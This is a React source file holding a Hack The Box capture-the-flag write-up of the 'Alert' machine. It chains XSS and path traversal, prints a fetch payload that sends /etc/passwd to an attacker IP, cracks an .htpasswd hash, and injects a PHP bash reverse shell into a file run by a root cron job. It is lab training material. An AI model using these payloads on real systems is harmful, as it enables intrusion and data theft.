// ✅ src/data/writeups/alert.js
import React from "react";
import InjectedImage from "../../components/InjectedImage";

import AlertIntro from "../../assets/Alert.png";
import NmapScan from "../../assets/alertnmap.png";
import LandingPage from "../../assets/alertlandingpage.png";
import MdFile from "../../assets/alertmdfile.png";
import ContactMessage from "../../assets/alertcontactsetup.png";
import ShareLink from "../../assets/alertsharelink.png";
import Listener from "../../assets/alertlistener.png";
import Base64Decode from "../../assets/alertbase64decode.png";
import MdHtpasswd from "../../assets/alertmdhtpasswd.png";
import HashCrack from "../../assets/alerthashcracked.png";
import SshAlbert from "../../assets/alertssh.png";
import EnumAfterSsh from "../../assets/alertenum.png";
import ReverseShellPayload from "../../assets/alertrspayload.png";
import RootShell from "../../assets/alertervshell.png";
import Pwned from "../../assets/alertpwned.png";

export const alertWriteup = [
  () => (
    <>
      <h2>📈 Introduction</h2>
      <InjectedImage imgSrc={AlertIntro} alt="Alert Logo" />
      <p>
        In this write-up, I’ll walk you through my approach to solving the{" "}
        <strong>Alert</strong> machine from Hack The Box. Alert is a Linux box
        rated as “Easy,” but it gave me a lot of web exploitation and privilege
        escalation practice.
      </p>
    </>
  ),

  () => (
    <>
      <h2>🔎 Enumeration</h2>
      <InjectedImage imgSrc={NmapScan} alt="Nmap Scan" />
      <p>
        Nmap revealed open ports 22 (SSH) and 80 (HTTP). The website was a
        Markdown Viewer at <code>http://alert.htb</code>.
      </p>
    </>
  ),

  () => (
    <>
      <h2>🌐 Web Landing & Initial XSS</h2>
      <InjectedImage imgSrc={LandingPage} alt="Landing Page" />
      <p>The site had a Markdown Viewer where I uploaded:</p>
      <InjectedImage imgSrc={MdFile} alt="Markdown File Upload" />
      <p>
        I then abused the contact form to trigger a bot to visit my malicious
        shared link:
      </p>
      <InjectedImage imgSrc={ContactMessage} alt="Contact Message Exploit" />
      <InjectedImage imgSrc={ShareLink} alt="Share Link" />
    </>
  ),

  () => (
    <>
      <h2>📥 Listener & File Extraction</h2>
      <p>Once the bot visited, I used a payload to exfiltrate files:</p>
      <pre>
        <code>
          fetch("http://alert.htb/messages.php?file=../../../../etc/passwd")
          .then(r =&gt; r.text()) .then(d =&gt;
          fetch("http://10.10.14.15:9001/?data=" + btoa(d)));
        </code>
      </pre>
      <InjectedImage imgSrc={Listener} alt="Listener Receiving Data" />

      <InjectedImage imgSrc={Base64Decode} alt="Base64 Decode Example" />
    </>
  ),

  () => (
    <>
      <h2>🔐 Extracting Credentials</h2>
      <p>
        I retrieved <code>/var/www/statistics.alert.htb/.htpasswd</code> using
        the same technique:
      </p>
      <InjectedImage imgSrc={MdHtpasswd} alt="Retrieved .htpasswd File" />
      <p>Then cracked the hash with Hashcat:</p>
      <InjectedImage imgSrc={HashCrack} alt="Cracked Password with Hashcat" />
    </>
  ),

  () => (
    <>
      <h2>🔑 SSH & Internal Enumeration</h2>
      <p>
        I connected via SSH as <code>albert:manchesterunited</code> and ran
        enumeration:
      </p>
      <InjectedImage imgSrc={SshAlbert} alt="SSH into albert Account" />

      <InjectedImage imgSrc={EnumAfterSsh} alt="Post SSH Enumeration" />
    </>
  ),

  () => (
    <>
      <h2>🚀 Privilege Escalation</h2>
      <p>
        I found that <code>/opt/website-monitor/config/configuration.php</code>{" "}
        was watched by a root cronjob.
      </p>
      <p>Injected payload:</p>
      <pre>
        <code>
          &lt;?php exec("/bin/bash -c 'bash -i &gt;&amp;
          /dev/tcp/10.10.14.15/9001 0&gt;&amp;1'"); ?&gt;
        </code>
      </pre>
      <p>I caught a root shell:</p>
      <InjectedImage imgSrc={RootShell} alt="Root Shell Access" />
      <InjectedImage
        imgSrc={ReverseShellPayload}
        alt="Reverse Shell Payload Injection"
      />
    </>
  ),

  () => (
    <>
      <h2>🏴 Root & Final Proof</h2>
      <InjectedImage imgSrc={Pwned} alt="Root + Pwned Proof" />
      <p>
        I captured both flags: <br />
        <strong>User:</strong> [REDACTED] <br />
        <strong>Root:</strong> [REDACTED]
      </p>
    </>
  ),

  () => (
    <>
      <h2>📜 Lessons Learned</h2>
      <ul>
        <li>File upload + XSS chaining</li>
        <li>XSS + SSRF-style file extraction</li>
        <li>Manual enumeration + LinPEAS to spot the escalation vector</li>
      </ul>
      <p>
        <strong>LinPEAS</strong> proved incredibly powerful once again.
      </p>
      <h3>✅ Machine Completed: Alert</h3>
      <a href="https://app.hackthebox.com/profile/1984386">9t0wl #1984386</a>
    </>
  ),
];
